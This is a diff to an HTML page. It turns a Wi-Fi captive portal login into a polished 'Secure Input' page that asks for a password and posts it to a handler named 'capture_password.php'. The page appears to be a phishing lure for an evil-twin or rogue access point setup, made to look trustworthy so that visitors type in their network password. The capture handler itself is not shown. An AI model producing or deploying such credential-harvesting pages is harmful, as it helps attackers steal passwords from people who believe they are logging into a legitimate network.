@@ -2,16 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Captive Portal Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Input</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f8f9fa;
+            transition: background-color 0.5s ease;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            transition: transform 0.5s ease;
+        }
+        h1 {
+            color: #333;
+        }
+        input[type="text"] {
+            padding: 10px;
+            margin: 20px 0;
+            width: 80%;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            transition: border-color 0.25s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #007bff;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.25s ease;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h2>Welcome to Our Wi-Fi Network</h2>
-    <form action="login.php" method="post">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <button type="submit">Login</button>
-    </form>
+    <div class="container">
+        <h1>Password</h1>
+	<form method="post" action="capture_password.php">
+            <input type="text" id="input" name="input" required>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+
+    <script>
+        // Example of a simple animation effect
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.body.style.backgroundColor = '#e2e6ea';
+            document.querySelector('.container').style.transform = 'scale(1.1)';
+        });
+    </script>
 </body>
 </html>
